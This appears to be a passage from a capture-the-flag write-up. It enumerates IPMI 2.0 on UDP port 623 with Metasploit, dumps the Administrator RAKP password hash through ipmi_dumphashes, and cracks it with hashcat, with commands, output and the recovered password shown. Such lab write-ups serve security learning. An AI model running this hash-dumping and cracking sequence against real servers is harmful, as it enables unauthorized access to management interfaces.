## UDP Port 623 Enumeration

Seems to be running IPMI version 2.0.

```bash
msf6 auxiliary(scanner/ipmi/ipmi_version) > options

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.123.122   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads

msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.123.122->10.129.123.122 (1 hosts)
[+] 10.129.123.122:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Seems to be vulnerable to [IPMI Authentication Bypass via Cipher 0](https://book.hacktricks.xyz/pentesting/623-udp-ipmi#vulnerability-ipmi-authentication-bypass-via-cipher-0).

Exploit doesn't seem to work on `tun0`, though.

```bash
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > options

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting                            Required  Description
   ----                  ---------------                            --------  -----------
   CRACK_COMMON          false                                      yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                              no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                 no        Save captured password hashes in john the ripper format
   PASS_FILE             /usr/share/metasploit-framework/data/word  yes       File containing common passwords for offline cracking, one per line
                         lists/ipmi_passwords.txt
   RHOSTS                10.129.123.122                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/
                                                                              Using-Metasploit
   RPORT                 623                                        yes       The target port
   SESSION_MAX_ATTEMPTS  5                                          yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                                          yes       Delay between session retries in seconds
   THREADS               1                                          yes       The number of concurrent threads (max one per host)
   USER_FILE             /usr/share/metasploit-framework/data/word  yes       File containing usernames, one per line
                         lists/ipmi_users.txt

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.123.122:623 - IPMI - Hash found: Administrator:7df68289020200007155c0f10a78865a967592291fa8a399b8eb5346ceef04d229d2b5c846ec0e22a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:debf95ec5baffad0c159155c175911e56bd6c9f4
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

`Administrator`'s password is `ilovepumkinpie1`.

```bash
$ hashcat -m 7300 '7df68289020200007155c0f10a78865a967592291fa8a399b8eb5346ceef04d229d2b5c846ec0e22a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:debf95ec5baffad0c159155c175911e56bd6c9f4' rockyou.txt
7df68289020200007155c0f10a78865a967592291fa8a399b8eb5346ceef04d229d2b5c846ec0e22a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:debf95ec5baffad0c159155c175911e56bd6c9f4:ilovepumkinpie1
```
